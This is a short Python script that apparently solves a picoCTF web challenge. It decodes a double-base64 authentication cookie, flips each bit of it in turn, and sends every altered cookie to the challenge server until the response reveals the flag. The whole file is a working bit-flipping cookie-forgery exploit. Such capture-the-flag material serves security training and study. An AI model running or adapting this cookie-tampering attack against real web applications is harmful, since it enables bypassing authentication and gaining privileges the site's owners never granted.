import requests
import base64


URL = 'http://mercury.picoctf.net:56136/'
encoded = 'QUtON2ZEUnBjMTBZaE1xOVJnNGIrVFJrVzkyM3BSOHlnQ29zQTQxTnhRdkZFbysyMkpXeFZ5cVJFZVZxckJBYlFoRmJuZmNkclJ2TWM2VDFvQnZ6QS96Q3Qvb2tJSXpXS3lPek1oSkRhdEJPa3E0a3dXOTFiVGpZcXQyTnh2b0g='
decoded = base64.b64decode(encoded)
double_decoded = base64.b64decode(decoded)


def flip_bit(data: bytes, pos: int, bitpos: int) -> bytes:
	return data[pos] ^ (1 << bitpos)


def exploit():
	for pos in range(len(double_decoded)):
		for bit in range(8):
			flipped = flip_bit(double_decoded, pos, bit)
			guess = double_decoded[:pos] + bytes([flipped]) + double_decoded[pos + 1:]
			guess_encoded = base64.b64encode(guess)
			guess_double_encoded = base64.b64encode(guess_encoded).decode()
			r = requests.get(URL, cookies={'auth_name': guess_double_encoded})
			if 'pico' in r.text:
				for line in r.text.splitlines():
					print(line) if 'picoCTF{' in line else ''
				return

if __name__ == '__main__':
	exploit()
